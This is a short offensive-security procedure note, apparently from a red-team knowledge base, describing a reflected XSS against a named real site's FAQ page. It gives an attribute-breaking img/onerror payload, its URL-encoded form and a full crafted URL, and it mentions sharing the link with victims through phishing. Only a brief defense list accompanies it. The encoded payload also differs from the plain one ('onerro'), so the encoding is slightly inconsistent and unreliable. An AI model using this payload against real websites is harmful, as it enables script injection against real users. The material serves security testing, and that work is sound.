---
tags:
  - xss
  - payload-injection
  - url-manipulation
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:26:22.219Z'
skill_level: beginner
impact_level: medium
detection_risk: low
sub_techniques: []
id: e4cc8f0e-2ee5-4b64-983e-36004f6b26b9
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject XSS Payload into URL Path

## Summary

This procedure crafts a malicious URL by injecting a URL-encoded JavaScript payload into the path parameter of the Glassdoor FAQ page, exploiting the lack of sanitization to prepare for reflected execution.

## Description

The vulnerability stems from the server reflecting the URL path directly into the page without encoding or validation. By inserting a payload like `""><img onerror="><img src=x onerror=alert`1`">` after 'Mic' in 'Microsoft', the attacker breaks out of the expected HTML attribute and injects executable script. This step focuses on constructing the tampered URL, which can then be shared via phishing to trick victims into loading it.

## Requirements

1. Knowledge of the base vulnerable URL.
2. URL encoding tools or manual encoding skills.
3. Target browser for testing (though not executed here).

## Defense

Defensive measures and detection strategies:

- Encode all URL path components before rendering in HTML.
- Validate path parameters against whitelists.
- Log and alert on unusual path lengths or characters.

## Objectives

1. Create a functional injected URL with encoded payload.
2. Ensure the payload breaks HTML context for execution.
3. Prepare URL for distribution or direct testing.

## Instructions

### Step 1: Encode and Insert Payload

**Context**: Manually construct the modified URL by URL-encoding the XSS payload and inserting it into the path.

The payload to encode: `"><img onerror="><img src=x onerror=alert`1`">`

Encoded version: `%22%3e%3cimg%20onerro%3d%3e%3cimg%20src%3dx%20onerror%3dalert%601%60%3e`

Construct the full URL:

```url
https://www.glassdoor.co.in/FAQ/Mic%22%3e%3cimg%20onerro%3d%3e%3cimg%20src%3dx%20onerror%3dalert%601%60%3erosoft-Question-FAQ200086-E1651.htm?countryRedirect=true
```

> Verify the encoding using a tool like an online URL encoder. The insertion point is after 'Mic' to close any open attributes.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[payload-injection]]
- [[url-manipulation]]
